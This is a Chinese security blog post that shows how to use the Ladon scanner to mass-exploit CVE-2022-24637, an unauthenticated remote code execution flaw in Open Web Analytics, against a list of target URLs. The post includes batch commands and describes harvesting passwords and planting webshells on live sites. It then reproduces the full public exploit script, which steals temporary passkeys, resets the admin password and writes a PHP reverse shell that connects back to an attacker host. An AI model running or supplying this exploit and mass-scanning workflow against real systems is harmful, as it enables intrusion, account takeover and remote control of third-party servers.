---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞速递】未授权RCE漏洞（附PoC）   
 LemonSec   2024-08-07 15:09  
  
本文主要教大家如何配置Ladon的INI插件，实现快速批量验证POC。该漏洞除了练手或提交SRC，可能没什么用，OWA登陆界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4YiacmZnh0zcjCFGfthUeZe6KNAUMU4PU1XoJSHQQnGFghmZSicRDkkcvKIGqLDAYCnG7Gt8Qewbxg/640?wx_fmt=png&wxfrom=13&tp=wxpic "")  
  
**Ladon插件 CVE-2022-24637.ini**  
  
INI插件最大的优势在于，可调用任意语言编写的POC，就是说在没有源码的情况下也可以，只要知道如何使用POC，然后填写参数，设置URL变量或IP变量即可  
。当别人放出POC时，我们只需要验证出一个成功的，即可Ladon批量****  
```
[Ladon]
exe=python
arg=CVE-2022-24637.py $ip$ -c
log=true
```  
  
**批量命令**  
```
Ladon url.txt cve-2022-24637
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4YiacmZnh0zcjCFGfthUeZenBoaaQ0QjkrQibibYf3jOT3le62CnYHy07NzDIRC96X385BE03ENEesA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
由于本地没搭有环境，EXP也是github上找的，并不知道成功是怎样的，所以没有重定向，先让Ladon跑一些URL，成功如上图所示，检测出漏洞时同时返回密码HASH，当然也有一些有漏洞但无法获取HASH的。重定向后，稍等一分钟，就自动获取了12个密码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4YiacmZnh0zcjCFGfthUeZeIEmUJVfMcVvCfYjDXd559YtNLoH0wE5XMvXfF60963vWKosia6icmAPg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
查看密码对应URL，再使用EXP写入webshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW4YiacmZnh0zcjCFGfthUeZe7ia77w2k1UJibwuQ394WiatthaYZsH27SMJOtD0ib4RkZncHLMGXBahTHg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**批量GetShell配置**  
```
[Ladon]
exe=python
arg=CVE-2022-24637.py $ip$ -i 123.123.123.123 -p 4444 -u admin
log=true
```  
  
webshell是随机地址，我们可以重定向输出结果  
```
Ladon url.txt GetShell.ini > shell.txt
```  
  
  
PS: 与Ladon联动的最佳Poc为.net编写的程序或DLL，可使用LadonEXP一键生成大部份WEB相关POC，非WEB洞需自己编写。  
  
  
PoC地址: https://www.exploit-db.com/exploits/51026  
```
# Exploit Title: Open Web Analytics 1.7.3 - Remote Code Execution (RCE)
# Date: 2022-08-30
# Exploit Author: Jacob Ebben
# Vendor Homepage: https://www.openwebanalytics.com/
# Software Link: https://github.com/Open-Web-Analytics
# Version: <1.7.4
# Tested on: Linux 
# CVE : CVE-2022-24637

import argparse
import requests
import base64
import re
import random
import string
import hashlib
from termcolor import colored

def print_message(message, type):
   if type == 'SUCCESS':
      print('[' + colored('SUCCESS', 'green') +  '] ' + message)
   elif type == 'INFO':
      print('[' + colored('INFO', 'blue') +  '] ' + message)
   elif type == 'WARNING':
      print('[' + colored('WARNING', 'yellow') +  '] ' + message)
   elif type == 'ALERT':
      print('[' + colored('ALERT', 'yellow') +  '] ' + message)
   elif type == 'ERROR':
      print('[' + colored('ERROR', 'red') +  '] ' + message)

def get_normalized_url(url):
   if url[-1] != '/':
      url += '/'
   if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
      url = "http://" + url
   return url

def get_proxy_protocol(url):
   if url[0:8].lower() == 'https://':
      return 'https'
   return 'http'

def get_random_string(length):
   chars = string.ascii_letters + string.digits
   return ''.join(random.choice(chars) for i in range(length))

def get_cache_content(cache_raw):
   regex_cache_base64 = r'\*(\w*)\*'
   regex_result = re.search(regex_cache_base64, cache_raw)
   if not regex_result:
      print_message('The provided URL does not appear to be vulnerable ...', "ERROR")
      exit()
   else:
      cache_base64 = regex_result.group(1)
   return base64.b64decode(cache_base64).decode("ascii")

def get_cache_username(cache):
   regex_cache_username = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
   return re.search(regex_cache_username, cache).group(1)

def get_cache_temppass(cache):
   regex_cache_temppass = r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
   return re.search(regex_cache_temppass, cache).group(1)

def get_update_nonce(url):
   try:
      update_nonce_request = session.get(url, proxies=proxies)
      regex_update_nonce = r'owa_nonce" value="(\w*)"'
      update_nonce = re.search(regex_update_nonce, update_nonce_request.text).group(1)
   except Exception as e:
      print_message('An error occurred when attempting to update config!', "ERROR")
      print(e)
      exit()
   else:
      return update_nonce

parser = argparse.ArgumentParser(description='Exploit for CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA)')
parser.add_argument('TARGET', type=str, 
                  help='Target URL (Example: http://localhost/owa/ or https://victim.xyz:8000/)')
parser.add_argument('ATTACKER_IP', type=str, 
                  help='Address for reverse shell listener on attacking machine')
parser.add_argument('ATTACKER_PORT', type=str, 
                  help='Port for reverse shell listener on attacking machine')
parser.add_argument('-u', '--username', default="admin", type=str,
                  help='The username to exploit (Default: admin)')
parser.add_argument('-p','--password', default=get_random_string(32), type=str,
                  help='The new password for the exploited user')
parser.add_argument('-P','--proxy', type=str,
                  help='HTTP proxy address (Example: http://127.0.0.1:8080/)')
parser.add_argument('-c', '--check', action='store_true',
                  help='Check vulnerability without exploitation')

args = parser.parse_args()

base_url = get_normalized_url(args.TARGET)
login_url = base_url + "index.php?owa_do=base.loginForm"
password_reset_url = base_url + "index.php?owa_do=base.usersPasswordEntry"
update_config_url = base_url + "index.php?owa_do=base.optionsGeneral"

username = args.username
new_password = args.password

reverse_shell = '<?php $sock=fsockopen("' + args.ATTACKER_IP + '",'+ args.ATTACKER_PORT + ');$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'
shell_filename = get_random_string(8) + '.php'
shell_url = base_url + 'owa-data/caches/' + shell_filename

if args.proxy:
   proxy_url = get_normalized_url(args.proxy)
   proxy_protocol = get_proxy_protocol(proxy_url)
   proxies = { proxy_protocol: proxy_url }
else:
   proxies = {}

session = requests.Session()

try:
   mainpage_request = session.get(base_url, proxies=proxies)
except Exception as e:
   print_message('Could not connect to "' + base_url, "ERROR")
   exit()
else:
   print_message('Connected to "' + base_url + '" successfully!', "SUCCESS")

if 'Open Web Analytics' not in mainpage_request.text:
   print_message('Could not confirm whether this website is hosting OWA! Continuing exploitation...', "WARNING")
elif 'version=1.7.3' not in mainpage_request.text:
   print_message('Could not confirm whether this OWA instance is vulnerable! Continuing exploitation...', "WARNING")
else:
   print_message('The webserver indicates a vulnerable version!', "ALERT")

try:
   data = {
      "owa_user_id": username, 
      "owa_password": username, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred during the login attempt!', "ERROR")
   print(e)
   exit()
else:
   print_message('Attempting to generate cache for "' + username + '" user', "INFO")

print_message('Attempting to find cache of "' + username + '" user', "INFO")

found = False

for key in range(100):
   user_id = 'user_id' + str(key)
   userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
   filename = userid_hash + '.php'
   cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
   cache_request = requests.get(cache_url, proxies=proxies)
   if cache_request.status_code != 200:
      continue;
   cache_raw = cache_request.text
   cache = get_cache_content(cache_raw)
   cache_username = get_cache_username(cache)
   if cache_username != username:
      print_message('The temporary password for a different user was found. "' + cache_username + '": ' + get_cache_temppass(cache), "INFO")
      continue;
   else:
      found = True
      break
if not found:
   print_message('No cache found. Are you sure "' + username + '" is a valid user?', "ERROR")
   exit()

cache_temppass = get_cache_temppass(cache)
print_message('Found temporary password for user "' + username + '": ' + cache_temppass, "INFO")

if args.check:
   print_message('The system appears to be vulnerable!', "ALERT")
   exit()

try:
   data = {
      "owa_password": new_password, 
      "owa_password2": new_password, 
      "owa_k": cache_temppass, 
      "owa_action": 
      "base.usersChangePassword"
   }
   session.post(password_reset_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when changing the user password!', "ERROR")
   print(e)
   exit()
else:
   print_message('Changed the password of "' + username + '" to "' + new_password + '"', "INFO")

try:
   data = {
      "owa_user_id": username, 
      "owa_password": new_password, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred during the login attempt!', "ERROR")
   print(e)
   exit()
else:
   print_message('Logged in as "' + username + '" user', "SUCCESS")

nonce = get_update_nonce(update_config_url)

try:
   log_location = "/var/www/html/owa/owa-data/caches/" + shell_filename
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
   session.post(update_config_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when attempting to update config!', "ERROR")
   print(e)
   exit()
else:
   print_message('Creating log file', "INFO")

nonce = get_update_nonce(update_config_url)

try:
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": reverse_shell 
   }
   session.post(update_config_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when attempting to update config!', "ERROR")
   print(e)
   exit()
else:
   print_message('Wrote payload to log file', "INFO")

try:
   session.get(shell_url, proxies=proxies)
except Exception as e:
   print(e)
else:
   print_message('Triggering payload! Check your listener!', "SUCCESS")
   print_message('You can trigger the payload again at "' + shell_url + '"' , "INFO")
```  
  
  
文章来源：k8实验室  
  
**侵权请私聊公众号删文**  
  
  
 **热文推荐******  
  
- [蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
  
  
- [通过DNSLOG回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
  
  
- [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
  
  
- [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
  
  
- [实战|通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
  
  
- [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
  
  
- [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
  
  
- [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
  
  
- [任意账号密码重置的6种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
  
  
- [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
  
  
- [手把手教你Linux提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)  
  
  
  
  
  
**欢迎关注LemonSec**  
  
  
**觉得不错点个“赞”、“在看”**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
